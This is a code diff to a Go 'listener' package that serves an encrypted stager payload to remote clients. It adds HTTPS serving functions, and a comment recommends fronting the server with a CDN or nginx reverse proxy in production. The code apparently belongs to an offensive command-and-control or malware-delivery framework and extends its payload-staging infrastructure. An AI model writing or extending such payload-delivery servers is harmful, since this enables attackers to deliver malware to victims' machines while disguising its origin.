@@ -2,6 +2,7 @@ package listener
 
 import (
 	"context"
+	"crypto/tls"
 	"fmt"
 	"net/http"
 	"os"
@@ -13,8 +14,10 @@ var (
 	httpServerMu sync.RWMutex
 )
 
-// serveStager serves the encrypted stager file over HTTP.
-func serveStager(stager_enc []byte, port string) error {
+// newStagerServer builds the HTTP server that serves stager_enc on the given
+// port, replacing any previously running server. The returned server is ready
+// to be started with ListenAndServe (plain HTTP) or ListenAndServeTLS.
+func newStagerServer(stager_enc []byte, port string) *http.Server {
 	httpServerMu.Lock()
 	if server != nil {
 		listenerLogf("Shutting down existing server on port %s", server.Addr)
@@ -37,9 +40,22 @@ func serveStager(stager_enc []byte, port string) error {
 		Handler: mux,
 	}
 	httpServerMu.Unlock()
+	return server
+}
 
+// serveStager serves the encrypted stager file over plain HTTP.
+func serveStager(stager_enc []byte, port string) error {
+	srv := newStagerServer(stager_enc, port)
 	listenerLogf("Starting HTTP server on port %s", port)
-	return server.ListenAndServe()
+	return srv.ListenAndServe()
+}
+
+// serveStagerTLS serves the encrypted stager file over HTTPS using tlsConfig.
+func serveStagerTLS(stager_enc []byte, port string, tlsConfig *tls.Config) error {
+	srv := newStagerServer(stager_enc, port)
+	srv.TLSConfig = tlsConfig
+	listenerLogf("Starting HTTPS server on port %s", port)
+	return srv.ListenAndServeTLS("", "")
 }
 
 // HTTPListener reads the payload file, encrypts it with the key-derived stream,
@@ -55,6 +71,19 @@ func HTTPListener(stagerPath, port, keyStr string) error {
 
 	listenerLogf("Serving payload on port %s via HTTP", port)
 	return serveStager(blob, port)
+}
+
+// HTTPListenerTLS is like HTTPListener but serves over HTTPS using tlsConfig.
+// It is intended for local testing; in production, terminate TLS at a
+// CDN/nginx reverse proxy and use HTTPListener.
+func HTTPListenerTLS(stagerPath, port, keyStr string, tlsConfig *tls.Config) error {
+	blob, err := buildServedBlob(stagerPath, keyStr)
+	if err != nil {
+		return err
+	}
+
+	listenerLogf("Serving payload on port %s via HTTPS", port)
+	return serveStagerTLS(blob, port, tlsConfig)
 }
 
 // HTTPBareListener serves the stager file over HTTP without any encryption or compression.
